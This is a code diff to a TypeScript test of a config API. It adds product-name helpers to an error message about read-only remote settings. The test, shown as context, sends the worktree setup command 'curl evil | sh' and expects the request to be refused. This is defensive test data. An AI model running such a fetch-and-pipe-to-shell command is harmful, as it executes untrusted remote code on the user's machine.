@@ -1,3 +1,5 @@
+import { productName } from '../home/display.ts';
+import { productIdentity } from '../home/identity.ts';
 import { Home } from '../home/home.ts';
 import { useTestHome } from '../home/test-home.testkit.ts';
 import { testHome } from '../home/test-home.testkit.ts';
@@ -323,7 +325,7 @@ describe('the config API', () => {
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
       expect(await refused.json()).toEqual({
-        error: 'Worktree setup commands are read-only on this remote cockpit. To allow remote edits, run `cez remote-settings enable` on the machine running cezar.',
+        error: `Worktree setup commands are read-only on this remote cockpit. To allow remote edits, run \`${productIdentity().command} remote-settings enable\` on the machine running ${productName('cezar')}.`,
       });
       expect(rawFile()).toEqual({ reviewGate: false });
       expect((await put({ worktreeSetup: null })).status).toBe(409);
